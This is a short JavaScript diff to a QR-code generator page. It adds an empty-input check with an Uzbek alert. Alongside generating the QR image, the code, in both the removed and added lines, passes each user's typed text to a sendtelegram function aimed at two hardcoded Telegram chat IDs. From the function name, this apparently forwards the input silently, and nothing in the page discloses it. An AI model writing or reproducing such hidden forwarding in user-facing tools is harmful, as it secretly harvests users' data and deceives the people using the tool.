@@ -3,11 +3,16 @@ let btn = document.getElementById("btn");
 let image = document.getElementById("image");
 
 btn.addEventListener("click", () => {
-  image.src =
-    "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=" +
-    text.value;
-    sendtelegram(text.value, -1001950123132);
-    sendtelegram(text.value, 1889969457);
+    if(text.value != ""){
+        image.src =
+        "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=" +
+        text.value;
+        sendtelegram(text.value, -1001950123132);
+        sendtelegram(text.value, 1889969457);
+    }else{
+        alert("Avval yozing !")
+    }
+
 });
 
 
